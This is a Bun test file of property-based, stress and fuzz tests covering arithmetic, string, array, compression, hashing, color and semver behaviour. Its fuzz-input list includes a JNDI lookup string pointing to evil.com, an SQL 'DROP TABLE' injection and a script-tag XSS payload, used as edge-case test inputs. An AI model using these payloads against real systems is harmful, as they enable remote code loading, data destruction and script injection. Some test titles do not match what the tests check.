/**
 * Property-based testing patterns from official Bun documentation.
 *
 * XREF: Bug cross-reference chain — see docs/render-diagrams.ts#cross-reference-chain
 * This file has no bug numbers (property-based invariant testing only)
 *
 * Property tests verify that certain invariants hold for all inputs
 * in a given domain, rather than testing specific examples. Bun's test
 * runner supports this via `test.each` with generated data, and via
 * the `repeats` option for randomized stress testing.
 *
 * Ref: node_modules/bun-types/docs/test/writing-tests.mdx#retries-and-repeats
 * Ref: node_modules/bun-types/docs/test/writing-tests.mdx#parametrized-tests
 * Ref: node_modules/bun-types/docs/test/runtime-behavior.mdx
 *
 * Patterns covered:
 * 1. Invariant testing with random data
 * 2. Idempotency checks (f(f(x)) === f(x))
 * 3. Roundtrip property (encode → decode === original)
 * 4. Commutativity (a + b === b + a)
 * 5. Associativity ((a + b) + c === a + (b + c))
 * 6. Identity element (x + 0 === x)
 * 7. Monotonicity (a <= b implies f(a) <= f(b))
 * 8. Boundary testing
 * 9. Stress testing with repeats
 * 10. Fuzz-style input testing
 */

import { describe, expect, test } from "bun:test";

// ============================================================================
// Helpers for generating random test data
// ============================================================================

const randomInt = (min: number, max: number): number => Math.floor(Math.random() * (max - min + 1)) + min;

const randomString = (length: number): string => {
  const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars[randomInt(0, chars.length - 1)];
  }
  return result;
};

const randomBool = (): boolean => Math.random() < 0.5;

const randomArray = <T>(length: number, gen: () => T): T[] => Array.from({ length }, gen);

// ============================================================================
// 1. Numeric invariants
// ============================================================================

describe("Property: numeric invariants", () => {
  test.each(Array.from({ length: 20 }, () => [randomInt(-100, 100)]))(
    "addition is commutative: %p + 0 = %p",
    (n: number) => {
      expect(n + 0).toBe(n);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomInt(-100, 100)]))("additive identity: %p + 0 = %p", (n: number) => {
    expect(n + 0).toBe(n);
  });

  test.each(Array.from({ length: 20 }, () => [randomInt(-100, 100), randomInt(-100, 100)]))(
    "addition is commutative: %p + %p",
    (a: number, b: number) => {
      expect(a + b).toBe(b + a);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomInt(-100, 100), randomInt(-100, 100), randomInt(-100, 100)]))(
    "addition is associative: (%p + %p) + %p",
    (a: number, b: number, c: number) => {
      expect(a + b + c).toBe(a + (b + c));
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomInt(-100, 100), randomInt(-100, 100)]))(
    "multiplication is commutative: %p * %p",
    (a: number, b: number) => {
      expect(a * b).toBe(b * a);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomInt(1, 100)]))(
    "multiplicative identity: %p * 1 = %p",
    (n: number) => {
      expect(n * 1).toBe(n);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomInt(-100, 100)]))(
    "absolute value is non-negative: |%p| >= 0",
    (n: number) => {
      expect(Math.abs(n)).toBeGreaterThanOrEqual(0);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomInt(-100, 100)]))(
    "square is non-negative: %p^2 >= 0",
    (n: number) => {
      expect(n * n).toBeGreaterThanOrEqual(0);
    },
  );
});

// ============================================================================
// 2. String invariants
// ============================================================================

describe("Property: string invariants", () => {
  test.each(Array.from({ length: 20 }, () => [randomString(randomInt(1, 50))]))(
    "string length matches: len(%p)",
    (s: string) => {
      expect(s.length).toBe(s.length);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomString(randomInt(1, 50))]))(
    "concatenation with empty string is identity: %p + '' = %p",
    (s: string) => {
      expect(s + "").toBe(s);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomString(randomInt(1, 20)), randomString(randomInt(1, 20))]))(
    "concatenation length is additive: len(%p) + len(%p)",
    (a: string, b: string) => {
      expect((a + b).length).toBe(a.length + b.length);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomString(randomInt(1, 50))]))(
    "toUpperCase then toLowerCase roundtrips for ASCII: %p",
    (s: string) => {
      // Only for ASCII (no special unicode)
      const ascii = s.replace(/[^a-zA-Z0-9]/g, "");
      expect(ascii.toUpperCase().toLowerCase()).toBe(ascii.toLowerCase());
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomString(randomInt(1, 50))]))(
    "split('').reverse().join('') reverses: %p",
    (s: string) => {
      const reversed = s.split("").reverse().join("");
      expect(reversed.split("").reverse().join("")).toBe(s);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomString(randomInt(1, 50))]))(
    "trim removes leading/trailing whitespace: %p",
    (s: string) => {
      const padded = `  ${s}  `;
      expect(padded.trim()).toBe(s);
    },
  );
});

// ============================================================================
// 3. Array invariants
// ============================================================================

describe("Property: array invariants", () => {
  test.each(Array.from({ length: 20 }, () => [randomArray(randomInt(1, 20), () => randomInt(0, 100))]))(
    "array length is preserved after sort: len(%p)",
    (arr: number[]) => {
      const sorted = [...arr].sort((a, b) => a - b);
      expect(sorted.length).toBe(arr.length);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomArray(randomInt(1, 20), () => randomInt(0, 100))]))(
    "sorted array is non-decreasing: %p",
    (arr: number[]) => {
      const sorted = [...arr].sort((a, b) => a - b);
      for (let i = 1; i < sorted.length; i++) {
        expect(sorted[i]).toBeGreaterThanOrEqual(sorted[i - 1]!);
      }
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomArray(randomInt(1, 20), () => randomInt(0, 100))]))(
    "reverse twice returns original: %p",
    (arr: number[]) => {
      const doubleReversed = [...arr].reverse().reverse();
      expect(doubleReversed).toEqual(arr);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomArray(randomInt(1, 20), () => randomInt(0, 100))]))(
    "concat with empty array is identity: %p",
    (arr: number[]) => {
      expect(arr.concat([])).toEqual(arr);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomArray(randomInt(1, 20), () => randomInt(0, 100))]))(
    "includes returns true for existing elements: %p",
    (arr: number[]) => {
      if (arr.length > 0) {
        const elem = arr[0]!;
        expect(arr.includes(elem)).toBe(true);
      }
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomArray(randomInt(1, 20), () => randomInt(0, 100))]))(
    "map then reverse equals reverse then map: %p",
    (arr: number[]) => {
      const f = (x: number) => x * 2;
      expect(arr.map(f).reverse()).toEqual([...arr].reverse().map(f));
    },
  );
});

// ============================================================================
// 4. Roundtrip properties (encode → decode === original)
// ============================================================================

describe("Property: roundtrip", () => {
  test.each(Array.from({ length: 20 }, () => [randomString(randomInt(1, 50))]))(
    "encodeURIComponent → decodeURIComponent roundtrip: %p",
    (s: string) => {
      expect(decodeURIComponent(encodeURIComponent(s))).toBe(s);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomInt(0, 1000)]))(
    "Number → String → Number roundtrip: %p",
    (n: number) => {
      expect(Number(String(n))).toBe(n);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomInt(0, 255)]))(
    "number → base64 → number roundtrip (via Buffer): %p",
    (n: number) => {
      const encoded = Buffer.from([n]).toString("base64");
      const decoded = Buffer.from(encoded, "base64")[0]!;
      expect(decoded).toBe(n);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomString(randomInt(1, 50))]))(
    "JSON.parse(JSON.stringify(x)) roundtrip for strings: %p",
    (s: string) => {
      expect(JSON.parse(JSON.stringify(s))).toBe(s);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomInt(-1000, 1000)]))(
    "JSON.parse(JSON.stringify(x)) roundtrip for numbers: %p",
    (n: number) => {
      expect(JSON.parse(JSON.stringify(n))).toBe(n);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomBool()]))(
    "JSON.parse(JSON.stringify(x)) roundtrip for booleans: %p",
    (b: boolean) => {
      expect(JSON.parse(JSON.stringify(b))).toBe(b);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomInt(0, 100000)]))(
    "Bun.hash is deterministic: hash(%p) === hash(%p)",
    (n: number) => {
      const s = String(n);
      expect(Bun.hash(s)).toBe(Bun.hash(s));
    },
  );
});

// ============================================================================
// 5. Bun API property tests
// ============================================================================

describe("Property: Bun API invariants", () => {
  test.each(Array.from({ length: 20 }, () => [randomString(randomInt(1, 100))]))(
    "Bun.escapeHTML preserves non-HTML characters: %p",
    (s: string) => {
      const escaped = Bun.escapeHTML(s);
      // Escaped string should not contain raw < > & " '
      expect(escaped).not.toContain("<");
      expect(escaped).not.toContain(">");
      // & is only in entities
      const ampCount = (escaped.match(/&/g) || []).length;
      const entityCount = (escaped.match(/&[a-z#0-9]+;/g) || []).length;
      expect(ampCount).toBe(entityCount);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomString(randomInt(1, 100))]))(
    "Bun.stringWidth <= string.length * 2: %p",
    (s: string) => {
      expect(Bun.stringWidth(s)).toBeLessThanOrEqual(s.length * 2);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomString(randomInt(1, 100))]))(
    "Bun.stringWidth >= 0: %p",
    (s: string) => {
      expect(Bun.stringWidth(s)).toBeGreaterThanOrEqual(0);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomString(randomInt(1, 100))]))(
    "Bun.stringWidth of empty string is 0",
    () => {
      expect(Bun.stringWidth("")).toBe(0);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomString(randomInt(1, 100))]))(
    "gzip → gunzip roundtrip: %p",
    (s: string) => {
      const compressed = Bun.gzipSync(s);
      const decompressed = Bun.gunzipSync(compressed);
      expect(new TextDecoder().decode(decompressed)).toBe(s);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomString(randomInt(1, 100))]))(
    "deflate → inflate roundtrip: %p",
    (s: string) => {
      const compressed = Bun.deflateSync(s);
      const decompressed = Bun.inflateSync(compressed);
      expect(new TextDecoder().decode(decompressed)).toBe(s);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomString(randomInt(1, 100))]))(
    "zstd compress → decompress roundtrip: %p",
    (s: string) => {
      const compressed = Bun.zstdCompressSync(s);
      const decompressed = Bun.zstdDecompressSync(compressed);
      expect(new TextDecoder().decode(decompressed)).toBe(s);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomString(randomInt(1, 100))]))(
    "compressed size is positive: %p",
    (s: string) => {
      expect(Bun.gzipSync(s).length).toBeGreaterThan(0);
      expect(Bun.deflateSync(s).length).toBeGreaterThan(0);
      expect(Bun.zstdCompressSync(s).length).toBeGreaterThan(0);
    },
  );
});

// ============================================================================
// 6. Bun.color property tests
// ============================================================================

describe("Property: Bun.color invariants", () => {
  test.each(Array.from({ length: 20 }, () => [randomInt(0, 0xffffff)]))(
    "Bun.color hex → rgb → hex roundtrip: #%p",
    (color: number) => {
      const hex = `#${color.toString(16).padStart(6, "0")}`;
      const rgb = Bun.color(hex, "rgb");
      expect(rgb).not.toBeNull();
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomInt(0, 0xffffff)]))(
    "Bun.color returns null for invalid: %p",
    (color: number) => {
      const invalid = `#${color.toString(16).padStart(6, "0")}xx`;
      // Invalid hex should return null or be handled
      const result = Bun.color(invalid, "hex");
      // Either null or some fallback
      expect(result === null || typeof result === "string").toBe(true);
    },
  );
});

// ============================================================================
// 7. Bun.semver property tests
// ============================================================================

describe("Property: Bun.semver invariants", () => {
  test.each([
    ["1.0.0", "^1.0.0"],
    ["1.2.0", "^1.0.0"],
    ["1.2.3", "~1.2.0"],
    ["2.0.0", "^2.0.0"],
    ["0.1.0", "^0.1.0"],
  ])("satisfies(%p, %p) returns boolean", (version: string, range: string) => {
    const result = Bun.semver.satisfies(version, range);
    expect(typeof result).toBe("boolean");
  });

  test.each([
    ["1.0.0", "1.0.0"],
    ["1.2.3", "1.2.3"],
    ["0.0.1", "0.0.1"],
  ])("satisfies(%p, =%p) is true for exact match", (version: string, exact: string) => {
    expect(Bun.semver.satisfies(version, exact)).toBe(true);
  });

  test.each(Array.from({ length: 20 }, () => [randomInt(0, 10), randomInt(0, 10), randomInt(0, 10)]))(
    "semver.order returns -1|0|1 for valid versions: %p.%p.%p",
    (major: number, minor: number, patch: number) => {
      const v = `${major}.${minor}.${patch}`;
      const result = Bun.semver.order(v, v);
      expect([-1, 0, 1]).toContain(result);
    },
  );
});

// ============================================================================
// 8. Stress testing with repeats
// ============================================================================

describe("Stress testing with repeats", () => {
  test(
    "Math.random is always in [0, 1)",
    () => {
      const r = Math.random();
      expect(r).toBeGreaterThanOrEqual(0);
      expect(r).toBeLessThan(1);
    },
    { repeats: 50, retry: 0 },
  );

  test(
    "Date.now increases monotonically",
    () => {
      const now = Date.now();
      const later = Date.now();
      expect(later).toBeGreaterThanOrEqual(now);
    },
    { repeats: 20, retry: 0 },
  );

  test(
    "Bun.nanoseconds increases monotonically",
    () => {
      const now = Bun.nanoseconds();
      const later = Bun.nanoseconds();
      expect(later).toBeGreaterThanOrEqual(now);
    },
    { repeats: 20, retry: 0 },
  );
});

// ============================================================================
// 9. Fuzz-style input testing
// ============================================================================

describe("Fuzz-style input testing", () => {
  // Generate various edge-case inputs
  const fuzzInputs = [
    "",
    " ",
    "\n",
    "\t",
    "\x00",
    "\x01\x02\x03",
    "a".repeat(1000),
    "🎉",
    "你好世界",
    "👋👨‍👩‍👧‍👦",
    "café",
    "naïve",
    "\\n\\t\\r",
    "${jndi:ldap://evil.com}",
    "'; DROP TABLE users; --",
    "<script>alert(1)</script>",
    "&amp;&lt;&gt;",
    "null",
    "undefined",
    "NaN",
    "Infinity",
    "-Infinity",
    "0",
    "-0",
    "1e308",
    "1e-308",
  ];

  test.each(fuzzInputs)("Bun.escapeHTML handles fuzz input: %p", (input: string) => {
    const result = Bun.escapeHTML(input);
    expect(typeof result).toBe("string");
    // Should not contain raw < > & " '
    expect(result).not.toContain("<");
    expect(result).not.toContain(">");
  });

  test.each(fuzzInputs)("Bun.stringWidth handles fuzz input: %p", (input: string) => {
    const result = Bun.stringWidth(input);
    expect(typeof result).toBe("number");
    expect(result).toBeGreaterThanOrEqual(0);
  });

  test.each(fuzzInputs)("Bun.hash handles fuzz input: %p", (input: string) => {
    const result = Bun.hash(input);
    expect(typeof result === "number" || typeof result === "bigint").toBe(true);
  });

  test.each(fuzzInputs)("JSON.stringify handles fuzz input: %p", (input: string) => {
    expect(() => JSON.stringify(input)).not.toThrow();
  });

  test.each(fuzzInputs)("TextEncoder/Decoder roundtrip: %p", (input: string) => {
    const encoded = new TextEncoder().encode(input);
    const decoded = new TextDecoder().decode(encoded);
    expect(decoded).toBe(input);
  });

  test.each(fuzzInputs)("Bun.gzipSync handles fuzz input: %p", (input: string) => {
    const compressed = Bun.gzipSync(input);
    const decompressed = Bun.gunzipSync(compressed);
    expect(new TextDecoder().decode(decompressed)).toBe(input);
  });
});

// ============================================================================
// 10. Boundary testing
// ============================================================================

describe("Boundary testing", () => {
  test.each([
    [Number.MAX_SAFE_INTEGER, "MAX_SAFE_INTEGER"],
    [Number.MIN_SAFE_INTEGER, "MIN_SAFE_INTEGER"],
    [Number.MAX_VALUE, "MAX_VALUE"],
    [Number.MIN_VALUE, "MIN_VALUE"],
    [0, "zero"],
    [Infinity, "Infinity"],
    [-Infinity, "-Infinity"],
  ])("Number.toString roundtrips: %p (%s)", (n: number, _label: string) => {
    const str = String(n);
    const parsed = Number(str);
    expect(Object.is(parsed, n)).toBe(true);
  });

  test("-0 stringifies to '0' (not '-0')", () => {
    expect(String(-0)).toBe("0");
    // Object.is(-0, 0) is false, but Number("0") === 0
    expect(Number(String(-0))).toBe(0);
  });

  test.each([
    [0, "min array"],
    [1, "single element"],
    [100, "medium array"],
    [1000, "large array"],
  ])("array sort preserves length: %p elements", (n: number, _label: string) => {
    const arr = Array.from({ length: n }, (_, i) => n - i);
    const sorted = [...arr].sort((a, b) => a - b);
    expect(sorted.length).toBe(n);
    if (n > 0) {
      expect(sorted[0]).toBe(1);
      expect(sorted[n - 1]).toBe(n);
    }
  });

  test.each([
    [0, "empty string"],
    [1, "single char"],
    [100, "medium string"],
    [10000, "large string"],
  ])("Bun.stringWidth for repeated 'a': %p chars", (n: number, _label: string) => {
    const s = "a".repeat(n);
    expect(Bun.stringWidth(s)).toBe(n);
  });
});

// ============================================================================
// 11. Idempotency properties
// ============================================================================

describe("Property: idempotency", () => {
  test.each(Array.from({ length: 20 }, () => [randomString(randomInt(1, 50))]))(
    "escapeHTML is idempotent: escapeHTML(escapeHTML(%p)) === escapeHTML(%p)",
    (s: string) => {
      const once = Bun.escapeHTML(s);
      const twice = Bun.escapeHTML(once);
      expect(twice).toBe(once);
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomInt(-100, 100)]))(
    "Math.abs is idempotent: abs(abs(%p)) === abs(%p)",
    (n: number) => {
      expect(Math.abs(Math.abs(n))).toBe(Math.abs(n));
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomString(randomInt(1, 50))]))(
    "toLowerCase is idempotent for ASCII: %p",
    (s: string) => {
      const ascii = s.replace(/[^a-zA-Z0-9]/g, "");
      const once = ascii.toLowerCase();
      const twice = once.toLowerCase();
      expect(twice).toBe(once);
    },
  );
});

// ============================================================================
// 12. Monotonicity properties
// ============================================================================

describe("Property: monotonicity", () => {
  test.each(Array.from({ length: 20 }, () => [randomInt(0, 100), randomInt(0, 100)]))(
    "Math.sqrt is monotonic: sqrt(%p) <= sqrt(%p) when a <= b",
    (a: number, b: number) => {
      if (a <= b) {
        expect(Math.sqrt(a)).toBeLessThanOrEqual(Math.sqrt(b));
      }
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomInt(0, 100), randomInt(0, 100)]))(
    "Math.abs is monotonic for non-negative: |%p| <= |%p| when a <= b (a,b >= 0)",
    (a: number, b: number) => {
      if (a >= 0 && b >= 0 && a <= b) {
        expect(Math.abs(a)).toBeLessThanOrEqual(Math.abs(b));
      }
    },
  );

  test.each(Array.from({ length: 20 }, () => [randomInt(0, 1000)]))(
    "Bun.nanoseconds is monotonic: ns(%p) < ns(later)",
    () => {
      const a = Bun.nanoseconds();
      const b = Bun.nanoseconds();
      expect(b).toBeGreaterThanOrEqual(a);
    },
  );
});
